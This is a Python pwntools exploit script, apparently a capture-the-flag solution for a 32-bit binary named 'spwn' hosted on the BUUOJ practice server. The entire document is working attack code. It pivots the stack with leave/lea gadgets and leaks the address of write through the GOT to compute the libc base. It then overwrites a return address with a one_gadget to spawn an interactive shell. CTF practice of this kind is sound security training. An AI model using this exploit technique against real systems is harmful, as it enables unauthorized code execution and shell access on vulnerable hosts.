from pwn import *

context.log_level = "info"

elf = ELF("./spwn")
lea_gadeget = 0x08048542 # lea esp, [ecx - 4] ; ret
lea_gadeget2 = 0x0804853e # mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, [ecx - 4] ; ret

#sock = process(elf.path)
sock = remote("node4.buuoj.cn",28054)

gs = """
    break *0x8048511
    continue
"""
#sock = gdb.debug(elf.path, gdbscript = gs)

payload = p32(0x804a300 + 0x20)
payload += p32(0x804a300 + 0x20)
payload += b"A" * (0x20 - 4 -  len(payload))
payload += p32(elf.plt["write"])
payload += p32(elf.sym["main"])
payload += p32(1)
payload += p32(elf.got["write"])
#payload += p32(elf.got["read"])
#payload += p32(elf.got["strlen"])
payload += p32(4)

sock.sendafter(b"Hello good Ctfer!\nWhat is your name?",payload)

payload = b"A" * 24
payload += p32(0x804a300 + 4)
payload += p32(lea_gadeget2)
sock.sendafter(b"What do you want to say?",payload)

leak_addr = sock.recv(4)
got_write_addr = u32(leak_addr)
log.info("got_write_addr = " + hex(got_write_addr))
libc_base_addr = got_write_addr - 0x00d43c0
log.info("libc_base_addr = " + hex(libc_base_addr))

one_gedget = libc_base_addr + 0x3a80c
payload = p32(1)
sock.sendafter(b"Hello good Ctfer!\nWhat is your name?",payload)

payload = b"A" * 28
payload += p32(one_gedget)
sock.sendafter(b"What do you want to say?",payload)

sock.interactive()
